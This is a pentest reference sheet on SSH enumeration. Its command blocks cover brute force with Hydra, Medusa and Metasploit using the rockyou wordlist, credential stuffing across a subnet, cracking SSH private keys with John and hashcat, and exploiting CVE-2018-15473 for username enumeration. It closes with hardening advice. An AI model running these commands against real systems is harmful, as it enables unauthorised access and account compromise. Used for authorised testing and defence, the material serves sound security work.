# SSH Enumeration (Port 22)

Enumerate SSH servers to identify authentication methods, supported algorithms, and potential vulnerabilities.
SSH is typically well-secured, but misconfigurations, weak keys, or credential reuse can provide initial access.

## Quick Reference

```bash
# Banner grabbing
nc -nv 10.10.10.10 22

# Enumerate authentication methods
ssh -v user@10.10.10.10

# Force password authentication
ssh -v user@10.10.10.10 -o PreferredAuthentications=password

# Brute force with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

## Banner Grabbing

```bash
# Using netcat
nc -nv 10.10.10.10 22

# Using telnet
telnet 10.10.10.10 22

# Using Nmap
nmap -p 22 -sV 10.10.10.10

# Detailed banner with SSH
ssh -v 10.10.10.10
```

## Authentication Methods

```bash
# List supported authentication methods
ssh -v user@10.10.10.10

# Force specific authentication method
ssh -v user@10.10.10.10 -o PreferredAuthentications=password
ssh -v user@10.10.10.10 -o PreferredAuthentications=publickey
ssh -v user@10.10.10.10 -o PreferredAuthentications=keyboard-interactive

# Disable specific authentication
ssh -v user@10.10.10.10 -o PubkeyAuthentication=no
```

## Nmap NSE Scripts

```bash
# SSH host key
nmap -p 22 --script ssh-hostkey 10.10.10.10

# Supported authentication methods
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 10.10.10.10

# Check for SSHv1
nmap -p 22 --script sshv1 10.10.10.10

# Enumerate algorithms
nmap -p 22 --script ssh2-enum-algos 10.10.10.10

# Brute force
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.10

# All SSH scripts
nmap -p 22 --script "ssh-*" 10.10.10.10
```

## Brute Force

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -L users.txt -P passwords.txt ssh://10.10.10.10

# Medusa
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ssh

# Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.10
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

## Credential Stuffing

```bash
# NetExec (1:1 user:pass mapping)
nxc ssh 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce

# Test single credential across multiple hosts
nxc ssh 10.10.10.0/24 -u admin -p 'Password123!'
```

## SSH Key Authentication

```bash
# Connect with private key
ssh -i id_rsa user@10.10.10.10

# Connect with private key (ignore host key checking)
ssh -i id_rsa -o StrictHostKeyChecking=no user@10.10.10.10

# Generate SSH key pair
ssh-keygen -t rsa -b 4096

# Copy public key to server
ssh-copy-id user@10.10.10.10

# Extract public key from private key
ssh-keygen -y -f id_rsa > id_rsa.pub
```

## SSH Tunneling

```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@10.10.10.10

# Remote port forwarding
ssh -R 8080:localhost:80 user@10.10.10.10

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@10.10.10.10

# SSH tunnel in background
ssh -f -N -L 8080:localhost:80 user@10.10.10.10
```

## File Transfer

```bash
# SCP - Copy file to remote
scp file.txt user@10.10.10.10:/tmp/

# SCP - Copy file from remote
scp user@10.10.10.10:/tmp/file.txt ./

# SCP - Copy directory recursively
scp -r directory/ user@10.10.10.10:/tmp/

# SFTP - Interactive file transfer
sftp user@10.10.10.10
```

## SSH Configuration

```bash
# View SSH client configuration
cat ~/.ssh/config

# View SSH server configuration (if accessible)
cat /etc/ssh/sshd_config

# Common SSH config options
Host target
    HostName 10.10.10.10
    User admin
    Port 22
    IdentityFile ~/.ssh/id_rsa
    StrictHostKeyChecking no
```

## Common Workflow

```bash
# Step 1: Banner grabbing
nc -nv 10.10.10.10 22

# Step 2: Enumerate authentication methods
ssh -v admin@10.10.10.10

# Step 3: Check for weak algorithms
nmap -p 22 --script ssh2-enum-algos 10.10.10.10

# Step 4: Try default credentials
ssh admin@10.10.10.10  # admin:admin, root:root, etc.

# Step 5: Credential stuffing (if you have user:pass list)
nxc ssh 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce

# Step 6: Brute force (last resort)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

## Notes

**SSH Version Information:**

Banner format: `SSH-<protocol_version>-<software_version>`

Example: `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`
- Protocol: SSH-2.0 (only accept SSH-2 protocol)
- Software: OpenSSH version 8.2p1
- OS: Ubuntu

**Authentication Methods:**

- **password**: Traditional username/password
- **publickey**: SSH key-based authentication
- **keyboard-interactive**: Interactive prompts (often used for 2FA)
- **gssapi-with-mic**: Kerberos authentication
- **hostbased**: Host-based authentication

**Common SSH Ports:**
- Port 22: Default SSH
- Port 2222: Alternative SSH port
- Port 22000-22999: Custom SSH ports

**Weak Algorithms to Look For:**

Encryption:
- 3des-cbc
- aes128-cbc, aes192-cbc, aes256-cbc
- arcfour, arcfour128, arcfour256

MAC:
- hmac-md5
- hmac-sha1-96
- hmac-md5-96

Key Exchange:
- diffie-hellman-group1-sha1
- diffie-hellman-group14-sha1

**SSH Misconfigurations:**

| Setting | Risk | Description |
|---------|------|-------------|
| `PermitRootLogin yes` | High | Allows direct root login |
| `PasswordAuthentication yes` | Medium | Allows password-based auth (brute force risk) |
| `PermitEmptyPasswords yes` | Critical | Allows accounts with no password |
| `PubkeyAuthentication no` | Low | Disables more secure key-based auth |
| `Protocol 1` | Critical | Uses deprecated SSHv1 protocol |
| `X11Forwarding yes` | Medium | Can be abused for privilege escalation |

**Common Vulnerabilities:**

- **CVE-2018-15473**: Username enumeration
- **CVE-2016-20012**: Pre-auth double free (OpenSSH < 8.7)
- **CVE-2021-41617**: Privilege escalation
- **Weak host keys**: Predictable or shared keys
- **Default credentials**: Vendor default passwords

**SSH Key Cracking:**

```bash
# Convert SSH private key to John format
ssh2john id_rsa > id_rsa.hash

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Crack with Hashcat (mode 22921 for RSA)
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt
```

**Username Enumeration:**

Some SSH versions are vulnerable to username enumeration:
```bash
# Using Metasploit
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 10.10.10.10
set USER_FILE users.txt
run

# Using Python script (CVE-2018-15473)
python3 ssh_enum.py --userList users.txt 10.10.10.10
```

**SSH Escape Sequences:**

When connected to SSH:
- `~.` - Disconnect
- `~^Z` - Background SSH
- `~#` - List forwarded connections
- `~?` - Display help

**Best Practices for Testing:**

1. Always check SSH version for known vulnerabilities
2. Test for username enumeration
3. Check for weak algorithms
4. Try default credentials before brute forcing
5. Look for exposed SSH keys in web directories, Git repos
6. Check for SSH key reuse across multiple systems
7. Monitor for account lockout policies
8. Use credential stuffing before brute force (less noisy)

**Defensive Recommendations:**

- Disable root login
- Use key-based authentication only
- Implement fail2ban or similar
- Change default port (security through obscurity)
- Use strong ciphers and MACs
- Enable SSH protocol 2 only
- Implement 2FA/MFA
- Monitor SSH logs for brute force attempts
- Use AllowUsers/AllowGroups to restrict access
